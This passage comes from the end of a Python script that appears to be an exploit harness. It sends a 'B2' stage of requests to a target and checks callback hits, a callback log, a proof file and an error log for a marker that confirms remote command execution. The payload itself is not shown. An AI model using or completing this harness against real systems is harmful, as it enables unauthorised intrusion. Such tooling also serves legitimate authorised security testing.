                                          args.timeout, args.max_response)
                row = stage_row("B2", raw, elapsed, index)
            except OSError as error:
                row = {"stage": "B2", "i": index, "bytes": 0, "status": 0,
                       "status_line": "", "error": "%s: %s" % (type(error).__name__, error)}
                summary["stages"].append(row)
                raw = b""
            (output / ("b2_%d.resp" % index)).write_bytes(raw)

            time.sleep(0.25)
            if collector is not None:
                hits = [hit for hit in collector.hits() if args.marker in hit["path"]]
                if hits:
                    evidence["callback_hits"] = hits
                    success = True
            if args.callback_log:
                text, cb_offset = read_from(args.callback_log, cb_offset)
                if args.marker in text:
                    evidence["callback_log"] = text[-4096:]
                    success = True
            if args.proof_file:
                try:
                    text = proof_path.read_text(errors="replace") if proof_path.exists() else ""
                except OSError:
                    text = ""
                if args.marker in text and text != proof_initial:
                    evidence["proof"] = text[-4096:]
                    success = True
            if args.error_log:
                text, err_offset = read_from(args.error_log, err_offset)
                if args.marker in text:
                    evidence["error_log"] = text[-4096:]
                    success = True
            if success:
                b2_hit = index
                break

        summary["evidence"] = evidence
        summary["b2_hit"] = b2_hit
        summary["success"] = bool(success)
        if success:
            summary["result"] = "command execution observed via a target callback/proof"
        else:
            summary["result"] = ("no callback, proof marker or error-log marker observed; "
                                 "not claiming execution")
        (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
        if collector is not None:
            (output / "callback.json").write_text(
                json.dumps(collector.hits(), indent=1) + "\n")
        print(json.dumps(summary, indent=1, sort_keys=True))
        return 0 if success else 5
    finally:
        if collector is not None:
            try:
                collector.stop()
            except Exception:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
